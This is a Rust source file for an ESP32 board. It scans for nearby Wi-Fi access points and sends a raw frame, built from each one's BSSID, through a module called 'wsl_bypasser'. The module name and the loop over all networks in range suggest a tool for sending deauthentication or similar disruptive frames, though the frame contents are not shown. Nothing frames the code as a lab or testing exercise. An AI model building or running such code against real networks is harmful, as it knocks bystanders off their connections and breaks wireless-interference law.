use esp_idf_sys as _; // If using the `binstart` feature of `esp-idf-sys`, always keep this module imported
use log::*;
use esp_idf_hal::peripherals::Peripherals;
use esp_idf_svc::{
    wifi::{EspWifi, WifiDeviceId},
    nvs::EspDefaultNvsPartition,
    eventloop::EspSystemEventLoop,
};

use crate::wsl_bypasser::{send_freedom, frame_builder};

mod wsl_bypasser;

fn main() {
    // It is necessary to call this function once. Otherwise some patches to the runtime
    // implemented by esp-idf-sys might not link properly. See https://github.com/esp-rs/esp-idf-template/issues/71
    esp_idf_sys::link_patches();
    // Bind the log crate to the ESP Logging facilities
    esp_idf_svc::log::EspLogger::initialize_default();

    info!("Starting...");

    let peripherals = Peripherals::take().unwrap();
    let sys_loop = EspSystemEventLoop::take().unwrap();
    let nvs = EspDefaultNvsPartition::take().unwrap();
    
    let mut wifi_driver = EspWifi::new(
        peripherals.modem,
        sys_loop,
        Some(nvs)
    ).unwrap();

    let scan_results = wifi_driver.scan().unwrap();
    for ap in scan_results{
        send_freedom(WifiDeviceId::Ap, &frame_builder(ap.bssid)).unwrap();
    }
}